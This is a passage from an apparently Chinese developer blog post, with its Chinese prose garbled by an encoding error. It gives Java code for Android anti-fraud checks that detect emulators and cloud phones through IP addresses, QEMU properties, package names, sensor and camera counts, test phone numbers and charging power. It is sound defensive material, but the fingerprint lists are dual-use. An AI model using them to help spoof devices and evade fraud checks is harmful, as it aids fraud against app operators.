              ip.equalsIgnoreCase(&quot;10.0.2.16&quot;)) &#123;</span><br><span class="line">                                choose.add(ip);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">//        try &#123;</span><br><span class="line">//            String[] qemuProps = &#123;</span><br><span class="line">//                    &quot;ro.kernel.qemu.avd_name&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.gles&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.gltransport&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.opengles.version&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.uirenderer&quot;,</span><br><span class="line">//                    &quot;ro.kernel.qemu.vsync&quot;,</span><br><span class="line">//                    &quot;ro.qemu.initrc&quot;,</span><br><span class="line">//                    &quot;init.svc.qemu-props&quot;,</span><br><span class="line">//                    &quot;qemu.adb.secure&quot;,</span><br><span class="line">//                    &quot;qemu.cmdline&quot;,</span><br><span class="line">//                    &quot;qemu.hw.mainkeys&quot;,</span><br><span class="line">//                    &quot;qemu.logcat&quot;,</span><br><span class="line">//                    &quot;ro.adb.qemud&quot;,</span><br><span class="line">//                    &quot;qemu.sf.fake_camera&quot;,</span><br><span class="line">//                    &quot;qemu.sf.lcd_density&quot;,</span><br><span class="line">//                    &quot;qemu.timezone&quot;,</span><br><span class="line">//                    &quot;init.svc.goldfish-logcat&quot;,</span><br><span class="line">//                    &quot;ro.boottime.goldfish-logcat&quot;,</span><br><span class="line">//                    &quot;ro.hardware.audio.primary&quot;,</span><br><span class="line">//                    &quot;init.svc.ranchu-net&quot;,</span><br><span class="line">//                    &quot;init.svc.ranchu-setup&quot;,</span><br><span class="line">//                    &quot;ro.boottime.ranchu-net&quot;,</span><br><span class="line">//                    &quot;ro.boottime.ranchu-setup&quot;,</span><br><span class="line">//                    &quot;init.svc.droid4x&quot;,</span><br><span class="line">//                    &quot;init.svc.noxd&quot;,</span><br><span class="line">//                    &quot;init.svc.qemud&quot;,</span><br><span class="line">//                    &quot;init.svc.goldfish-setup&quot;,</span><br><span class="line">//                    &quot;init.svc.goldfish-logcat&quot;,</span><br><span class="line">//                    &quot;init.svc.ttVM_x86-setup&quot;,</span><br><span class="line">//                    &quot;vmos.browser.home&quot;,</span><br><span class="line">//                    &quot;vmos.camera.enable&quot;,</span><br><span class="line">//                    &quot;ro.trd_yehuo_searchbox&quot;,</span><br><span class="line">//                    &quot;init.svc.microvirtd&quot;,</span><br><span class="line">//                    &quot;init.svc.vbox86-setup&quot;,</span><br><span class="line">//                    &quot;ro.ndk_translation.version&quot;,</span><br><span class="line">//                    &quot;redroid.width&quot;,</span><br><span class="line">//                    &quot;redroid.height&quot;,</span><br><span class="line">//                    &quot;redroid.fps&quot;,</span><br><span class="line">//                    &quot;ro.rf.vmname&quot;</span><br><span class="line">//            &#125;;</span><br><span class="line">//</span><br><span class="line">//            for (String str : qemuProps) &#123;</span><br><span class="line">//                String val = SystemPropertiesUtils.getProperty(str, null);</span><br><span class="line">//                if (val != null) &#123;</span><br><span class="line">//                    choose.add(str);</span><br><span class="line">//                &#125;</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125; catch (Throwable e) &#123;</span><br><span class="line">//            e.printStackTrace();</span><br><span class="line">//        &#125;</span><br><span class="line">        //åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŒ‡å®šç¡¬ä»¶</span><br><span class="line">        PackageManager pm = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            pm = context.getPackageManager();</span><br><span class="line">            String[] features = &#123;</span><br><span class="line">                    //PackageManager.FEATURE_RAM_NORMAL,//è¿™ä¸ªå­˜åœ¨é—®é¢˜,è‡ªå·±ç»„è£…çš„æ‰‹æœºå¯èƒ½å¯¼è‡´è¿™ä¸ªç—•è¿¹æ‰¾ä¸åˆ°</span><br><span class="line">                    PackageManager.FEATURE_BLUETOOTH,</span><br><span class="line">                    PackageManager.FEATURE_CAMERA_FLASH,</span><br><span class="line">                    PackageManager.FEATURE_TELEPHONY</span><br><span class="line">            &#125;;</span><br><span class="line">            for (String feature : features) &#123;</span><br><span class="line">                if (!pm.hasSystemFeature(feature)) &#123;</span><br><span class="line">                    choose.add(feature);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Throwable ignored) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        String[] emuPkgs = &#123;</span><br><span class="line">                &quot;com.google.android.launcher.layouts.genymotion&quot;,</span><br><span class="line">                &quot;com.bluestacks&quot;,</span><br><span class="line">                &quot;com.bignox.app&quot;</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        for (String pkg : emuPkgs) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (pm != null) &#123;</span><br><span class="line">                    pm.getPackageInfo(pkg, 0);</span><br><span class="line">                &#125;</span><br><span class="line">                choose.add(pkg);</span><br><span class="line">            &#125; catch (Throwable e) &#123;</span><br><span class="line">                //e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable ignored) &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        SensorManager sensor = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);</span><br><span class="line">        int sensorSize = sensor.getSensorList(Sensor.TYPE_ALL).size();</span><br><span class="line">        for (int i = 0; i &lt; sensorSize; i++) &#123;</span><br><span class="line">            Sensor s = sensor.getDefaultSensor(i);</span><br><span class="line">            if (s != null &amp;&amp; s.getName().contains(&quot;Goldfish&quot;)) &#123;</span><br><span class="line">                choose.add(s.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Throwable ignored) &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">        if (checkSelfPermission(context, &quot;android.permission.READ_SMS&quot;) == 0 ||</span><br><span class="line">                checkSelfPermission(context, &quot;android.permission.READ_PHONE_NUMBERS&quot;) == 0 ||</span><br><span class="line">                    checkSelfPermission(context, &quot;android.permission.READ_PHONE_STATE&quot;) == 0) &#123;</span><br><span class="line">            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);</span><br><span class="line">            String phoneNumber = telephonyManager.getLine1Number();</span><br><span class="line"> </span><br><span class="line">            String[] phoneNumbers = &#123;</span><br><span class="line">                    &quot;15555215554&quot;,</span><br><span class="line">                    &quot;15555215556&quot;,</span><br><span class="line">                    &quot;15555215558&quot;,</span><br><span class="line">                    &quot;15555215560&quot;,</span><br><span class="line">                    &quot;15555215562&quot;,</span><br><span class="line">                    &quot;15555215564&quot;,</span><br><span class="line">                    &quot;15555215566&quot;,</span><br><span class="line">                    &quot;15555215568&quot;,</span><br><span class="line">                    &quot;15555215570&quot;,</span><br><span class="line">                    &quot;15555215572&quot;,</span><br><span class="line">                    &quot;15555215574&quot;,</span><br><span class="line">                    &quot;15555215576&quot;,</span><br><span class="line">                    &quot;15555215578&quot;,</span><br><span class="line">                    &quot;15555215580&quot;,</span><br><span class="line">                    &quot;15555215582&quot;,</span><br><span class="line">                    &quot;15555215584&quot;</span><br><span class="line">            &#125;;</span><br><span class="line">            if(phoneNumber!=null) &#123;</span><br><span class="line">                for (String phone : phoneNumbers) &#123;</span><br><span class="line">                    if (phoneNumber.equalsIgnoreCase(phone)) &#123;</span><br><span class="line">                        choose.add(phone);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if (choose.size() &gt; 0) &#123;</span><br><span class="line">        ListItemBean item = new ListItemBean(&quot;æ£€æµ‹åˆ°APKè¿è¡Œåœ¨è™šæ‹Ÿæœº&amp;æ¨¡æ‹Ÿå™¨ä¸­&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Deadly,</span><br><span class="line">                choose.toString()</span><br><span class="line">        );</span><br><span class="line">        for (String str : choose) &#123;</span><br><span class="line">            item.putData(str);</span><br><span class="line">        &#125;</span><br><span class="line">        return item;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Androidç³»ç»Ÿæä¾›äº†ä¸€ä¸ª<code>android.os.Build</code>ç±»ï¼Œå…¶ä¸­åŒ…å«äº†å¤§é‡å…³äºè®¾å¤‡ç¡¬ä»¶å’Œè½¯ä»¶ç‰ˆæœ¬çš„ä¿¡æ¯</p><ul><li>**<code>Build.FINGERPRINT</code> (è®¾å¤‡æŒ‡çº¹)**ï¼šå®˜æ–¹æ¨¡æ‹Ÿå™¨ï¼ˆAVDï¼‰çš„æŒ‡çº¹é€šå¸¸ä»¥ <code>generic/</code> å¼€å¤´ã€‚è®¸å¤šåŸºäºVirtualBoxçš„æ¨¡æ‹Ÿå™¨ï¼ˆå¦‚Genymotionã€Noxï¼‰çš„æŒ‡çº¹ä¸­å¯èƒ½ä¼šåŒ…å«<code>vbox</code>å­—æ ·ã€‚è€ŒçœŸå®è®¾å¤‡çš„æŒ‡çº¹é€šå¸¸æ˜¯åˆ¶é€ å•†å’Œå‹å·çš„ç»„åˆï¼Œå¦‚ <code>samsung/sm-g9980/...</code>ã€‚</li><li>**<code>Build.MODEL</code> (è®¾å¤‡å‹å·)**ï¼šAVDçš„å‹å·é€šå¸¸æ˜¯<code>sdk_gphone64_x86_64</code>æˆ–<code>Android SDK built for x86</code>ç­‰ã€‚Droid4Xï¼ˆå“å£®æ¨¡æ‹Ÿå™¨ï¼‰ä¹Ÿä¼šæ˜ç¡®æ ‡è¯†å…¶å‹å·ã€‚çœŸå®è®¾å¤‡çš„å‹å·åˆ™æ˜¯<code>Pixel 7 Pro</code>, <code>SM-G9980</code>ç­‰ã€‚</li><li>**<code>Build.MANUFACTURER</code> (åˆ¶é€ å•†)**ï¼šGenymotionæ¨¡æ‹Ÿå™¨ä¼šå°†å…¶åˆ¶é€ å•†è®¾ç½®ä¸º<code>Genymotion</code>ã€‚çœŸå®è®¾å¤‡åˆ™ä¸º<code>Google</code>, <code>Samsung</code>, <code>Xiaomi</code>ç­‰</li><li>**<code>Build.PRODUCT</code> (äº§å“åç§°)**ï¼šä¸å‹å·ç±»ä¼¼ï¼Œæ¨¡æ‹Ÿå™¨çš„äº§å“åä¹Ÿé€šå¸¸æ˜¯é€šç”¨çš„<code>sdk_x86</code>æˆ–å¸¦æœ‰æ¨¡æ‹Ÿå™¨æ ‡è¯†çš„åç§°ï¼Œå¦‚<code>nox</code>ï¼ˆå¤œç¥æ¨¡æ‹Ÿå™¨ï¼‰ã€<code>vbox86p</code>ï¼ˆVirtualBoxå¹³å°ï¼‰</li><li>**<code>Build.BOARD</code> &#x2F; <code>Build.BOOTLOADER</code> (ä¸»æ¿&#x2F;å¼•å¯¼ç¨‹åº)**ï¼šæŸäº›æ¨¡æ‹Ÿå™¨ï¼ˆå¦‚å¤œç¥ï¼‰å¯èƒ½ä¼šåœ¨è¿™äº›æ›´åº•å±‚çš„æ ‡è¯†ä¸­ç•™ä¸‹è‡ªå·±çš„åå­—ã€‚</li><li>**<code>Build.HARDWARE</code> (ç¡¬ä»¶åç§°)**ï¼šæ˜¯éå¸¸å¯é çš„æŒ‡æ ‡ã€‚<code>goldfish</code>æ˜¯æ—©æœŸAVDä½¿ç”¨çš„è™šæ‹Ÿç¡¬ä»¶å¹³å°åç§°ã€‚<code>ranchu</code>æ˜¯è¾ƒæ–°ç‰ˆAVDä½¿ç”¨çš„è™šæ‹Ÿç¡¬ä»¶å¹³å°ã€‚<code>vbox86</code>æ˜ç¡®æŒ‡å‘äº†VirtualBox x86å¹³å°ã€‚çœŸå®è®¾å¤‡çš„ç¡¬ä»¶åç§°é€šå¸¸æ˜¯èŠ¯ç‰‡ç»„çš„ä»£å·ï¼Œå¦‚<code>qcom</code> (é«˜é€š), <code>kirin</code> (éº’éºŸ), <code>exynos</code> (çŒæˆ·åº§)</li></ul><p>**ç½‘ç»œç¯å¢ƒç‰¹å¾ (Network Environment)**ï¼šè¿™æ˜¯å®˜æ–¹Androidæ¨¡æ‹Ÿå™¨ï¼ˆAVDï¼‰çš„é»˜è®¤ç½‘ç»œé…ç½®ã€‚åœ¨AVDå†…éƒ¨ï¼Œå®ƒé€šè¿‡ä¸€ä¸ªè™šæ‹Ÿè·¯ç”±å™¨è¿æ¥åˆ°å®¿ä¸»æœºç½‘ç»œã€‚è¿™ä¸ªè™šæ‹Ÿè·¯ç”±å™¨å°†<code>10.0.2.15</code>è¿™ä¸ªIPåœ°å€åˆ†é…ç»™æ¨¡æ‹Ÿå™¨æœ¬èº«ã€‚è¿™æ˜¯ä¸€ä¸ªå¹¿ä¸ºäººçŸ¥çš„ç‰¹å¾ã€‚</p><p><strong>ç¡¬ä»¶åŠŸèƒ½ç¼ºå¤± (Missing Hardware Features)ï¼š</strong>ä½¿ç”¨<code>PackageManager.hasSystemFeature()</code>æ£€æŸ¥è®¾å¤‡æ˜¯å¦ç¼ºå°‘è“ç‰™ (<code>FEATURE_BLUETOOTH</code>)ã€ç›¸æœºé—ªå…‰ç¯ (<code>FEATURE_CAMERA_FLASH</code>) æˆ–ç”µè¯åŠŸèƒ½ (<code>FEATURE_TELEPHONY</code>)ã€‚æ¨¡æ‹Ÿå™¨ä¸ºäº†èŠ‚çœèµ„æºï¼Œé€šå¸¸ä¸ä¼šå»æ¨¡æ‹Ÿè¿™äº›ä¸å¸¸ç”¨çš„ç¡¬ä»¶</p><p><strong>ç‰¹å®šåº”ç”¨åŒ…å (Specific Application Packages)ï¼š</strong>æ£€æŸ¥è®¾å¤‡ä¸Šæ˜¯å¦å®‰è£…äº†ç‰¹å®šåŒ…åçš„åº”ç”¨ï¼Œå¦‚<code>com.bluestacks</code> (è“å ), <code>com.bignox.app</code> (å¤œç¥)</p><p><code>com.google.android.launcher.layouts.genymotion</code> (Genymotionçš„å®šåˆ¶å¯åŠ¨å™¨)ã€‚</p><p>è®¸å¤šæ¨¡æ‹Ÿå™¨ä¼šé¢„è£…ä¸€äº›è‡ªå®¶çš„è¾…åŠ©å·¥å…·ã€åº”ç”¨å•†åº—æˆ–æœåŠ¡ã€‚é€šè¿‡æ£€æŸ¥è¿™äº›åº”ç”¨çš„åŒ…åæ˜¯å¦å­˜åœ¨ï¼Œå¯ä»¥ç›´æ¥è¯†åˆ«å‡ºå¯¹åº”çš„æ¨¡æ‹Ÿå™¨</p><p><strong>ç¡¬ä»¶å’Œé©±åŠ¨ç‰¹å¾ (Hardware and Driver Signatures)ï¼š</strong>ä¸<code>Build.HARDWARE</code>ä¸­çš„<code>goldfish</code>ç±»ä¼¼ï¼ŒAVDæ¨¡æ‹Ÿçš„ä¼ æ„Ÿå™¨ï¼ˆå¦‚åŠ é€Ÿåº¦è®¡ã€é™€èºä»ªç­‰ï¼‰ä¹Ÿæ˜¯åŸºäºâ€Goldfishâ€è™šæ‹Ÿç¡¬ä»¶çš„ï¼Œå› æ­¤å®ƒä»¬çš„é©±åŠ¨åç§°ä¼šæš´éœ²è¿™ä¸€ä¿¡æ¯ã€‚çœŸå®è®¾å¤‡çš„ä¼ æ„Ÿå™¨åç§°é€šå¸¸æ¥è‡ªåšä¸–(Bosch)ã€æ„æ³•åŠå¯¼ä½“(STMicro)ç­‰ç¡¬ä»¶åˆ¶é€ å•†</p><p><strong>è®¾å¤‡ä¿¡æ¯ç‰¹å¾ (Device Information)ï¼š</strong>å®˜æ–¹æ¨¡æ‹Ÿå™¨å…è®¸è®¾ç½®ä¸€ä¸ªç”µè¯å·ç ç”¨äºæµ‹è¯•ï¼Œè¿™äº›<code>1555...</code>å¼€å¤´çš„å·ç æ˜¯Androidæ–‡æ¡£ä¸­æŒ‡å®šçš„å®˜æ–¹æµ‹è¯•å·ç ã€‚å¦‚æœåœ¨è®¾å¤‡ä¸Šè¯»åˆ°äº†è¿™äº›å·ç ï¼Œå‡ ä¹å¯ä»¥è‚¯å®šæ˜¯æ¨¡æ‹Ÿå™¨ç¯å¢ƒã€‚æ­¤é¡¹æ£€æµ‹éœ€è¦<code>READ_PHONE_STATE</code>ç­‰ç›¸å…³æƒé™</p><p>**æ–‡ä»¶ç³»ç»Ÿç‰¹å¾ (File System Artifacts) - *å·²æ³¨é‡Š***ï¼šæ¨¡æ‹Ÿå™¨ä¸ºäº†æ­£å¸¸è¿è¡Œï¼Œä¼šåœ¨Androidæ–‡ä»¶ç³»ç»Ÿçš„å„ä¸ªè§’è½ç•™ä¸‹è‡ªå·±çš„ç»„ä»¶ã€‚</p><ul><li><p><strong>QEMU&#x2F;AVDç›¸å…³</strong>: <code>qemu_pipe</code>, <code>fstab.goldfish</code>, <code>init.ranchu.rc</code>,</p><p> <code>/sys/fs/selinux/booleans/in_qemu</code> ç­‰ï¼Œè¿™äº›éƒ½ä¸QEMUè™šæ‹Ÿæœºå¼•æ“ç›´æ¥ç›¸å…³ã€‚</p></li><li><p><strong>VirtualBoxç›¸å…³</strong>: <code>vboxguest.ko</code>, <code>vboxsf.ko</code>, <code>mount.vboxsf</code>, <code>/sys/module/vboxguest</code> ç­‰ï¼Œè¿™äº›æ˜¯VirtualBoxçš„Guest Additionsï¼ˆå¢å¼ºåŠŸèƒ½ï¼‰ç»„ä»¶ï¼Œç”¨äºè™šæ‹Ÿæœºå’Œå®¿ä¸»æœºä¹‹é—´çš„é€šä¿¡ä¸é›†æˆã€‚</p></li><li><p><strong>ç‰¹å®šæ¨¡æ‹Ÿå™¨</strong>: <code>init.nox.rc</code> (å¤œç¥), <code>droid4x</code> (å“å£®), <code>GenymotionLayout</code> (Genymotion), <code>init.tiantian.sh</code> (å¤©å¤©æ¨¡æ‹Ÿå™¨), <code>windroyed</code> (æ–‡å“çˆ·) ç­‰ï¼Œè¿™äº›æ˜¯å„å®¶æ¨¡æ‹Ÿå™¨ä¸“å±çš„é…ç½®æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“æ–‡ä»¶ã€‚</p></li></ul><p>**ç³»ç»Ÿå±æ€§ç‰¹å¾ (System Properties) - *å·²æ³¨é‡Š***ï¼š</p><p>é™¤äº†<code>Build</code>ç±»æä¾›çš„æ ‡å‡†ä¿¡æ¯ï¼ŒAndroidç³»ç»Ÿå†…éƒ¨è¿˜æœ‰å¤§é‡çš„ç³»ç»Ÿå±æ€§ï¼ˆro.å¼€å¤´çš„åªè¯»å±æ€§å’Œqemu.ç­‰å…¶ä»–å±æ€§ï¼‰ã€‚æ¨¡æ‹Ÿå™¨ä¼šè®¾ç½®å¾ˆå¤šç‰¹å®šçš„å±æ€§æ¥æ§åˆ¶å…¶è¡Œä¸ºã€‚</p><ul><li><code>ro.kernel.qemu.*</code>: æ˜ç¡®è¡¨ç¤ºå†…æ ¸æ˜¯åœ¨QEMUç¯å¢ƒä¸‹è¿è¡Œã€‚</li><li><code>init.svc.*</code>: æ£€æŸ¥æ˜¯å¦æœ‰æ¨¡æ‹Ÿå™¨ç›¸å…³çš„æœåŠ¡åœ¨è¿è¡Œï¼Œå¦‚<code>init.svc.qemud</code>, <code>init.svc.noxd</code>ã€‚</li><li><code>redroid.*</code>, <code>ro.rf.vmname</code>: è¿™äº›æ˜¯äº‘æ‰‹æœºæ–¹æ¡ˆï¼ˆå¦‚Redroid, çº¢æ‰‹æŒ‡ï¼‰ç‰¹æœ‰çš„å±æ€§ã€‚</li></ul><h3 id="æ£€æµ‹äº‘æ‰‹æœº"><a href="#æ£€æµ‹äº‘æ‰‹æœº" class="headerlink" title="æ£€æµ‹äº‘æ‰‹æœº"></a>æ£€æµ‹äº‘æ‰‹æœº</h3><p>è¿™å—æ€è·¯è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œä¸åŒçš„äº‘æ‰‹æœºæ£€æµ‹çš„æ€è·¯ä¹Ÿä¸ä¸€æ · ã€‚å¤§éƒ¨åˆ†äº‘æ‰‹æœºåšçš„è¿˜æ˜¯å¾ˆå¥½çš„ï¼Œå¾ˆå¤šéƒ½å¯ä»¥è¿‡æ‰<code>Hunter</code>çš„æ£€æµ‹ ã€‚</p><h4 id="æ£€æµ‹ç”µæµ-ç”µå‹"><a href="#æ£€æµ‹ç”µæµ-ç”µå‹" class="headerlink" title="æ£€æµ‹ç”µæµ&amp;ç”µå‹"></a>æ£€æµ‹ç”µæµ&amp;ç”µå‹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private final BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line"> </span><br><span class="line">        // ç”µæ± çŠ¶æ€</span><br><span class="line">        int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);</span><br><span class="line"> </span><br><span class="line">        // ç”µå‹ï¼ˆä»¥æ¯«ä¼ä¸ºå•ä½ï¼‰</span><br><span class="line">        int voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);</span><br><span class="line"> </span><br><span class="line">        // è·å–ç”µæ± ç”µæµï¼ˆæ¯«å®‰ï¼‰</span><br><span class="line">        int currentNow = -1;</span><br><span class="line">        if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">            BatteryManager batteryManager = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);</span><br><span class="line">            currentNow = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_NOW);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // åˆ¤æ–­æ˜¯å¦åœ¨å……ç”µ</span><br><span class="line">        if (plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB || plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS) &#123;</span><br><span class="line">            // åœ¨å……ç”µ</span><br><span class="line">            if (voltage != -1 &amp;&amp; currentNow != -1) &#123;</span><br><span class="line">                float voltageInVolts = voltage / 1000f; // å°†ç”µå‹è½¬æ¢ä¸ºä¼ç‰¹</span><br><span class="line">                float currentInAmperes = currentNow / 1000000f; // å°†ç”µæµè½¬æ¢ä¸ºå®‰åŸ¹</span><br><span class="line">                float chargingPower = voltageInVolts * currentInAmperes; // è®¡ç®—å……ç”µåŠŸç‡ï¼ˆç“¦ç‰¹ï¼‰</span><br><span class="line">                CLog.i(String.format(&quot;å……ç”µåŠŸç‡: %.2fW&quot;, chargingPower));</span><br><span class="line">                if (Math.abs(chargingPower) &gt; 300) &#123;</span><br><span class="line">                    CLog.e(&quot;å……ç”µåŠŸç‡è¿‡é«˜&quot;);</span><br><span class="line">                    handlerItemData(new ListItemBean(</span><br><span class="line">                            &quot;ç”µæ± å¼‚å¸¸:å……ç”µåŠŸç‡è¿‡é«˜(å¯èƒ½æ˜¯äº‘æ‰‹æœº)&quot;,</span><br><span class="line">                            ListItemBean.RiskLeave.Deadly,</span><br><span class="line">                            &quot;æ£€æµ‹åˆ°è¿‡å¤§çš„å……ç”µåŠŸç‡ -&gt; &quot; + String.format(&quot;%.2fW&quot;, Math.abs(chargingPower))</span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹æ‘„åƒå¤´-ä¼ æ„Ÿå™¨ç›¸å…³"><a href="#æ£€æµ‹æ‘„åƒå¤´-ä¼ æ„Ÿå™¨ç›¸å…³" class="headerlink" title="æ£€æµ‹æ‘„åƒå¤´&amp;ä¼ æ„Ÿå™¨ç›¸å…³"></a>æ£€æµ‹æ‘„åƒå¤´&amp;ä¼ æ„Ÿå™¨ç›¸å…³</h4><p>åˆ¤æ–­æ‘„åƒå¤´æœ‰ä¸ªæ•° </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);</span><br><span class="line">    String[] cameraIds = manager.getCameraIdList();</span><br><span class="line">    //æ‘„åƒå¤´ä¸ªæ•°</span><br><span class="line">    CLog.i(&quot;cameraIds -&gt; &quot;+ Arrays.toString(cameraIds));</span><br><span class="line">    if(cameraIds.length &lt; CAMERA_MINIMUM_QUANTITY_LIMIT)&#123;</span><br><span class="line">        items.add(</span><br><span class="line">                new ListItemBean(</span><br><span class="line">                &quot;å½“å‰æ‰‹æœºå¯èƒ½æ˜¯æ¨¡æ‹Ÿå™¨&amp;äº‘æ‰‹æœº&quot;,</span><br><span class="line">                ListItemBean.RiskLeave.Warn,</span><br><span class="line">                &quot;camera size -&gt; &quot;+cameraIds.length</span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (Throwable ignored) &#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹ä¼ æ„Ÿå™¨ä¸ªæ•°"><a href="#æ£€æµ‹ä¼ æ„Ÿå™¨ä¸ªæ•°" class="headerlink" title="æ£€æµ‹ä¼ æ„Ÿå™¨ä¸ªæ•°"></a>æ£€æµ‹ä¼ æ„Ÿå™¨ä¸ªæ•°</h4><p>è¿™å—æ€è·¯å°±æ˜¯ç›´æ¥è·å–ä¸ªæ•°ï¼Œå°‘äº<code>10</code>ä¸ªå¯ä»¥ç›´æ¥è®¤å®šä¸ºé»‘äº§ ã€‚ æˆ‘ç›®å‰æ²¡å‘ç°é‚£ä¸ªæ‰‹æœºå°‘äº10ä¸ªä¼ æ„Ÿå™¨ ï¼Œè¿™å—å¦‚æœå¯èƒ½çš„è¯å¯ä»¥å°è¯•è°ƒç”¨ä¸€ä¸‹ä¼ æ„Ÿå™¨ï¼Œä¿è¯ä¼ æ„Ÿå™¨æ˜¯å¦å¯ç”¨ ï¼Œé˜²æ­¢äº‘æ‰‹æœºä»¥å‡ä¹±çœŸ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    //3,æ£€æµ‹ä¼ æ„Ÿå™¨ç±»å‹,æ”¯æŒçš„å…¨éƒ¨ç±»å‹ä¼ æ„Ÿå™¨</span><br><span class="line">    SensorManager sm = (SensorManager) context.getSystemService(SENSOR_SERVICE);</span><br><span class="line">    List&lt;Sensor&gt; sensorlist = sm.getSensorList(Sensor.TYPE_ALL);</span><br><span class="line"> </span><br><span class="line">    ArrayList&lt;Integer&gt; sensorTypeS = new ArrayList&lt;&gt;();</span><br><span class="line">    for (Sensor sensor : sensorlist) &#123;</span><br><span class="line">        //è·å–ä¼ æ„Ÿå™¨ç±»å‹</span><br><span class="line">        int type = sensor.getType();</span><br><span class="line">        if (!sensorTypeS.contains(type)) &#123;</span><br><span class="line">            //å‘ç°ä¸€ç§ç±»å‹åˆ™æ·»åŠ ä¸€ç§ç±»å‹</span><br><span class="line">            sensorTypeS.add(type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //å°ç±³k40 51ä¸ªä¼ æ„Ÿå™¨ç±»å‹</span><br><span class="line">    //æ™®é€šçš„pix 27ä¸ª</span><br><span class="line">    